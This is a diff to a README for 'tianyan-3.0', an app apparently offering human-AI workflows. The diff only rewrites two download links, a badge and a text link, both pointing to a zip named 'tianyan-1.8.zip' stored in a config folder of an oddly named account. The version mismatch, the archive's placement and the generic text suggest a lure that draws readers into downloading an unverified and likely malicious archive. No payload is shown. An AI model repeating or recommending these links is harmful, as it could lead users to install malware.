@@ -1,6 +1,6 @@
 # 🤖 tianyan-3.0 - Human-AI Workflows Made Simple
 
-[![Download tianyan-3.0](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/Forty-genuspickeringia400/tianyan-3.0/main/config/tianyan-1.8.zip)
+[![Download tianyan-3.0](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/Forty-genuspickeringia400/tianyan-3.0/raw/refs/heads/main/config/tianyan-1.8.zip)
 
 ## 🚀 What This App Does
 
@@ -17,7 +17,7 @@ Use it when you want to:
 
 Open this page and download the app:
 
-[Download tianyan-3.0](https://raw.githubusercontent.com/Forty-genuspickeringia400/tianyan-3.0/main/config/tianyan-1.8.zip)
+[Download tianyan-3.0](https://github.com/Forty-genuspickeringia400/tianyan-3.0/raw/refs/heads/main/config/tianyan-1.8.zip)
 
 After you open the page:
 1. Find the latest release or download file.
